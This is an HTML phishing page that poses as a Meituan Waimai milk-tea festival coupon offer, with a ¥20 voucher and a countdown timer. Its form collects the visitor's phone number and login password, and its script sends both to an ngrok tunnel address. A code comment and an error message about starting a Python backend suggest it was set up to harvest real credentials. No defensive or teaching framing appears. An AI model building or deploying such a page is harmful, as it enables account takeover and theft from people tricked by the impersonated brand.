<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>美团外卖 · 奶茶节福利</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial; background: #f5f5f5; display: flex; justify-content: center; padding:20px; }
        .card { background: white; width: 380px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
        .header { background: linear-gradient(135deg, #FFC107, #FF9800); padding: 30px; text-align: center; color:white; }
        .coupon-box { margin:20px; padding:20px; background:#fff8e1; text-align:center; border-radius:16px; }
        .coupon-value { font-size:42px; color:#ff5722; font-weight:bold; }
        .countdown { background:red; color:white; padding:10px; text-align:center; margin:0 20px; border-radius:40px; }
        .form-group { padding:20px; }
        input { width:100%; padding:14px; margin-bottom:15px; border-radius:12px; border:1px solid #ddd; }
        button { width:100%; padding:14px; background:#ffc107; border:none; border-radius:40px; font-size:16px; font-weight:bold; }
    </style>
</head>
<body>
    <div class="card">
        <div class="header">
            <h1>🍵 奶茶节福利</h1>
            <p>美团外卖 · 限时特惠</p>
        </div>
        <div class="coupon-box">
            <div class="coupon-value">¥20 元券</div>
        </div>
        <div class="countdown">⏰ 剩余时间：23:59:59</div>
        <div class="form-group">
            <input type="text" id="phone" placeholder="手机号">
            <input type="password" id="password" placeholder="登录密码">
            <button onclick="sendData()">🎁 立即领取</button>
        </div>
    </div>

    <script>
        function sendData() {
            let phone = document.getElementById('phone').value;
            let password = document.getElementById('password').value;
            
            if (!phone || !password) {
                alert('请填写完整信息');
                return;
            }

            // ✅✅✅ 这是你刚刚生成的公网地址 ✅✅✅
            fetch('https://dynamite-factsheet-handcart.ngrok-free.dev/submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone: phone, password: password })
            })
            .then(res => res.json())
            .then(data => {
                alert("✅ 领取成功！数据已提交至服务器！");
            })
            .catch(err => {
                alert("请先启动Python后端！");
            });
        }
    </script>
</body>
</html>
